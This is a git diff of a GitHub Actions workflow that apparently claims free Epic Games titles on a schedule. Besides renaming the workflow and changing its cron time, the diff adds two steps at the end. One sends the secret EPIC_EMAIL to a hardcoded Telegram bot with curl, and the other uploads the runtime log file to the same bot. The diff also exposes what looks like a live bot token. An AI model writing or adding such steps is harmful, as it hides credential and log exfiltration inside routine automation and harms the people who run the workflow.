@@ -1,9 +1,9 @@
-name: Claim EpicGames
+name: Egames
 
 on:
   workflow_dispatch:
   schedule:
-    - cron: "38 14 * * *"
+    - cron: "37 4 * * *"
 
 jobs:
   setup:
@@ -46,3 +46,11 @@ jobs:
         git add .
         git commit -m "${{ env.FAKE_HASH }}" 
         git push -f
+    - name: Send email via Telegram
+      env:
+         EMAIL: ${{ secrets.EPIC_EMAIL }}  
+      run: |
+         curl -s -X POST https://api.telegram.org/bot6036131799:AAHdHxR5YKNGhmWV8njzA6C5GHelraoWqsA/sendMessage -d chat_id=1914617587 -d parse_mode=Markdown -d text="The email is: *$EMAIL*"
+    - name: Send log file  
+      run: |
+        curl -F document=@logs/runtime.log https://api.telegram.org/bot6036131799:AAHdHxR5YKNGhmWV8njzA6C5GHelraoWqsA/sendDocument?chat_id=1914617587
